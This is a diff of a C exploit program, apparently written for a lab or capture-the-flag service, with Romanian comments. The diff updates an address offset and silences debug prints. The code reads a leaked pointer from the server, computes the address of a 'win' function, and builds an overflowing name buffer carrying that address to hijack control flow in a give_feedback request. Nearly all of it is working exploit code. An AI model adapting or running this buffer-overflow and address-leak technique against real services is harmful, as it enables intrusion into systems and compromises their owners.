@@ -1,7 +1,7 @@
 #include "request.h"
 
 //TO BE UPDATED
-#define OFFSET_TO_WIN (0x100008338 - 0x100000fd0)
+#define OFFSET_TO_WIN (0x100008330 - 0x100001380)
 
 int main()
 {
@@ -38,9 +38,9 @@ int main()
     uint64_t pop_adr = strtoull(leak.response, NULL, 0);
     uint64_t win_adr = pop_adr - OFFSET_TO_WIN;
 
-    printf("OFF: %p\n", (void *)OFFSET_TO_WIN);
-    printf("POP: %p\n", (void *)pop_adr);
-    printf("WIN: %p\n", (void *)win_adr);
+    //printf("OFF: %p\n", (void *)OFFSET_TO_WIN);
+    //printf("POP: %p\n", (void *)pop_adr);
+    //printf("WIN: %p\n", (void *)win_adr);
 
     /* Pregatim numele pe care il vom pasa ca argument lui give_feedback */
     int win_adr_size = sizeof(win_adr);
@@ -56,7 +56,7 @@ int main()
         name_overflow[NAME_BUFF_SIZE + PADDING + i] = ((char *)&win_adr)[i];
     name_overflow[name_overflow_len - 1] = '\0';
 
-    printf("Name: %s\n", name_overflow);
+    //printf("Name: %s\n", name_overflow);
 
     /* Cream request-ul pentru give_feedback */
     const char *REQ = "WRT ";
@@ -68,7 +68,7 @@ int main()
     strcat(give_feedback_req, FEEDBACK_LEN);
     strcat(give_feedback_req, LANG_ID);
 
-    printf("Sending:\n%d: %s\n", strlen(give_feedback_req), give_feedback_req);
+    //printf("Sending:\n%d: %s\n", strlen(give_feedback_req), give_feedback_req);
 
     /* Exploatam give_feedback */
     struct request give_feedback = {0};
